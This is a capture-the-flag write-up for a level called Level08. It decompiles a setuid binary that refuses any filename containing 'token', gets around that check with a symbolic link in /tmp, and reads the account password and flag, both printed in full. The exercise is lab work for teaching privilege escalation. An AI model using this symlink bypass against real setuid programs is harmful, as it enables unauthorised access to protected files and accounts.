# Level08

## Solution

We have an executable and a file named token.

```
$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

Let's try to launch the executable with the token file.

```
$ ./level08 token
You may not access 'token'
```

Thanks to this site, we can get an idea of the code contained in the executable file.
</br>
<<https://dogbolt.org/>>

```
scp -P 4242 level08@192.168.56.101:/home/user/level08/level08 .
```

```
if (a0 == 1)
{
	printf("%s [file to read]\n");
	exit(1); /* do not return */
}
else if (strstr(a1->field_4, "token"))
{
	printf("You may not access '%s'\n");
	exit(1); /* do not return */
}
else
{
	v2 = open(a1->field_4, 0, *((int *)&v0));
	if (v2 == -1)
		err(1, "Unable to open %s"); /* do not return */
	v3 = read(v2, &v4, 0x400);
	if (v3 == -1)
		err(1, "Unable to read fd %d"); /* do not return */
	v9 = write(1, &v4, v3);
	if (!(v5 ^ *((int *)_ccall(v6, v7, (unsigned int)v8, 20))))
		return v9;
	__stack_chk_fail(); /* do not return */
}
```

We can see that the executable just blocks the name if it contains ``token``.

```
$ ln -s /home/user/level08/token /tmp/test
```

If we create a symbolic link to token to have a different argument name, it should work.

```
$ ./level08 /tmp/test
quif5eloekouj29ke0vouxean
```

However, the token is not the flag but the account password.

```
$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```